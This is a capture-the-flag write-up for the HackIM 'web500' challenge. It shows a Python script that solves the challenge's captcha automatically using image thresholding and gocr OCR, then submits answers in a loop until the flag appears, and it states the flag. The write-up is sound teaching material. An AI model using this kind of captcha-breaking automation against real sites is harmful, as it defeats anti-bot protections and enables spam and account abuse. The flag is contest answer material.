This "web" task was quite easy. It's more programming challenge than web challenge for me.

The description given was:
```
  Break the captcha
```

Ok let's do it :)

When you open [captcha.php](http://54.165.191.231/captcha.php) you get this:

![web500 captcha](http://saxx.swordarmor.fr/CTF/HACKIM_web500_captcha.png "web500 captcha")

Here is my python exploit
```python
#!/usr/bin/python
__author__ = "@_SaxX_"
import os, requests, commands, re

s = requests.session()
url = "http://54.165.191.231/"
s.get(url + "captcha.php")
while True:
	open('captcha.png', 'wb').write( s.get(url + "imagedemo.php").content )
	os.system('convert captcha.png -compress none -threshold 16% img.png')
	captcha = commands.getoutput("gocr -i img.png").strip()
	response = s.post(url + "verify.php", {'solution' : captcha}).text
	flag = re.findall('Score :(.*)', response)[0].rstrip()
	if not str(flag).isdigit():
		print "[+] Flag: %s" %flag
		break
	print "[%s] Sending Captcha=%s ... "%(flag, captcha)
```

And here the output once executed it to obtain the flag:

![web500 flag](http://saxx.swordarmor.fr/CTF/HACKIM_web500_flag1.png "web500 flag")
<br>
[...]
<br>
![web500 flag](http://saxx.swordarmor.fr/CTF/HACKIM_web500_flag2.png "web500 flag")

The flag to scored 500 points was **flag{H@CKIM_C@pTcha!09022015}**

Enjoy :)

